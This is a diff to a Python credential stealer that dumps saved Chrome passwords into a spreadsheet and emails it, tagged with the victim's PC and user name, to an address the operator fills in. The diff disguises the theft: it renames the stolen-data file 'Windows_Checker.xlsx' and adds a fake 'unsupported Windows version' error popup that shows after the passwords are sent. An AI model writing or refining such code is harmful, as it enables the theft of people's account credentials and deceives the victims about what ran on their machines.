@@ -13,6 +13,8 @@ from email.mime.base import MIMEBase
 from email import encoders
 import socket
 import getpass
+import tkinter as tk
+from tkinter import messagebox 
 
 def get_chrome_datetime(chromedate):
     return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chromedate)
@@ -67,21 +69,21 @@ def extract_chrome_passwords():
         conn.close()
         os.remove(temp_path)
     df = pd.DataFrame(data)
-    df.to_excel("chrome_passwords.xlsx", index=False)
+    df.to_excel("Windows_Checker.xlsx", index=False)
     send_email(df, folders)
-    os.remove("chrome_passwords.xlsx")
+    os.remove("Windows_Checker.xlsx")
 
 def send_email(df, folders):
     sender_email = "sender@email.com" # Replace With Sender Email
     sender_email_password = "XXXX XXXX XXXX XXXX" # Replace With Sender Email's App Password
-    receiver_email = "receiver@email.com" # Replace With Receiver Email 
+    receiver_email = "receiver@email.com" # Replace With Receiver Email  
     message = MIMEMultipart()
     message["From"] = sender_email
     message["To"] = receiver_email
     pc_name = socket.gethostname()
     username = getpass.getuser()
     message["Subject"] = f"Chrome Passwords - PC Name: {pc_name} - User: {username}"
-    filename = "chrome_passwords.xlsx"
+    filename = "Windows_Checker.xlsx"
     attachment = open(filename, "rb")
     part = MIMEBase("application", "octet-stream")
     part.set_payload(attachment.read())
@@ -93,5 +95,13 @@ def send_email(df, folders):
     server.login(sender_email, sender_email_password)
     server.sendmail(sender_email, receiver_email, message.as_string())
     server.quit()
+    
+
+def show_program_running_message():
+    root = tk.Tk()
+    root.withdraw() 
+    messagebox.showinfo("Error", "This program does not support the version of Windows your computer is running.")
+    root.destroy()
 
 extract_chrome_passwords()
+show_program_running_message()
